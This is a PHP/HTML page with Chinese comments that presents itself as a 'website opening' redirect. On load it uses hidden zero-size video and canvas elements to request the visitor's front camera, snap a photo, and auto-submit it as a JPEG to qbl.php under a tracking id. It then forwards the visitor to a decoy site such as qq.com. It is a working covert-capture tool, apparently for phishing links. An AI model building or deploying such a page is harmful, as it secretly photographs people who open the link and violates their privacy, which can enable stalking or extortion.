<?php
// sc.php - 拍照页面
error_reporting(0);

// 获取参数
$id = $_GET['id'] ?? '';
$url = $_GET['url'] ?? 'http://qq.com';

// 验证参数
if (empty($id)) {
    die('ID参数错误');
}

// 对URL进行编码
$encoded_url = urlencode($url);
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>打开网站中…</title>
</head>
<body>
    <video id="video" width="0" height="0" autoplay></video>
    <canvas style="width:0px;height:0px" id="canvas" width="480" height="640"></canvas>
    
    <script type="text/javascript">
        window.addEventListener("DOMContentLoaded", function() {
            var canvas = document.getElementById('canvas');
            var context = canvas.getContext('2d');
            var video = document.getElementById('video');

            if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user', // 前置摄像头
                        width: { ideal: 1920 },
                        height: { ideal: 1080 }
                    } 
                }).then(function(stream) {
                    video.srcObject = stream;
                    video.play();
                    
                    // 等待摄像头就绪
                    setTimeout(function(){
                        context.drawImage(video, 0, 0, 480, 640);
                        
                        setTimeout(function(){
                            var img = canvas.toDataURL('image/jpeg', 0.8); // JPEG格式，80%质量
                            document.getElementById('result').value = img;
                            document.getElementById('gopo').submit();
                            
                            // 停止摄像头
                            stream.getTracks().forEach(track => track.stop());
                        }, 300);
                    }, 1000);
                    
                }).catch(function(error){
                    console.error('摄像头错误:', error);
                    // 即使摄像头失败也提交表单（跳到下一页面）
                    document.getElementById('gopo').submit();
                });
            } else {
                // 不支持摄像头，直接跳转
                document.getElementById('gopo').submit();
            }
        }, false);
    </script>
    
    <form action="qbl.php?id=<?php echo htmlspecialchars($id); ?>&url=<?php echo htmlspecialchars($encoded_url); ?>" 
          id="gopo" method="post">
        <input type="hidden" name="img" id="result" value="" />
    </form>
</body>
</html>